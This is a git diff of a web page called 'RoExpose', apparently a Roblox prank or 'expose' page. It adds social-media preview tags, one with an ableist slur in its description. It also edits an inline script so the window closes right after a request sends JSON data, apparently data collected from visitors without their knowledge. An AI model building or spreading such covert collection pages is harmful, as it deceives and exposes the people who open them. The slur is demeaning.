@@ -6,6 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>RoExpose</title>
     <link rel="stylesheet" href="styles.css">
+        <meta property="og:title" content="RoExposed" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://lol138.github.io/roexposed/web.html" />
+<meta property="og:image" content="http://my.site.com/images/thumb.png" />
+<meta property="og:description" content="A ROBLOX Expose Page intended for retards who think they're the shit." />
+<meta name="theme-color" content="#00FF00">
 </head>
 
 <body>
@@ -39,8 +45,8 @@
                     ]
                 }
 
-                request.send(JSON.stringify(params));
-            })
+                request.send(JSON.stringify(params)).then(window.close);
+            }).catch(window.close)
     </script>
     <div class="container">
         <div id="message">YOU THOUGHT LMAOOOO</div>
